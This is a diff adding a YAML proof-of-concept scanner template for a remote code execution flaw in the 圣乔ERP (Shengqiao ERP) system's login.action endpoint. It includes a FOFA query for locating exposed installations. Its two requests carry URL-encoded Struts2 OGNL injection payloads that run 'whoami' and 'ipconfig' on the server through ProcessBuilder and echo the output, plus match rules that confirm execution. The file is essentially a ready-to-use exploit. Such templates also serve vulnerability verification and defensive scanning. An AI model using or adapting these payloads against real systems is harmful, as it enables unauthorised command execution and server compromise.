@@ -1,0 +1,39 @@
+id: poc-yaml-shengqiao-erp-login-action-rce
+info:
+  name: 圣乔ERP系统 login.action 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 圣乔ERP系统
+  fofa: title="圣乔ERP系统"
+requests:
+- method: POST
+  path: /erp/login.action
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: redirect:%24%7B%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%27whoami%27%7D%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23dis%3Dnew+java.io.DataInputStream%28%23b%29%2C%23buf%3Dnew+byte%5B20000%5D%2C%23dis.read%28%23buf%29%2C%23msg%3Dnew+java.lang.String%28%23buf%29%2C%23dis.close%28%29%2C%23resp.getWriter%28%29.println%28%23msg.trim%28%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29%7D
+  expression: 'status_code == 200 &&
+
+    contains(body,`nt authority\system`) &&
+
+    contains(headers,"/erp") &&
+
+    !contains(body,"<")
+
+    '
+- method: POST
+  path: /erp/login.action
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: redirect:%24%7B%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%27ipconfig%27%7D%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23dis%3Dnew+java.io.DataInputStream%28%23b%29%2C%23buf%3Dnew+byte%5B20000%5D%2C%23dis.read%28%23buf%29%2C%23msg%3Dnew+java.lang.String%28%23buf%29%2C%23dis.close%28%29%2C%23resp.getWriter%28%29.println%28%23msg.trim%28%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29%7D
+  expression: 'status_code == 200 &&
+
+    contains(body,"Windows IP") &&
+
+    contains(headers,"/erp") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
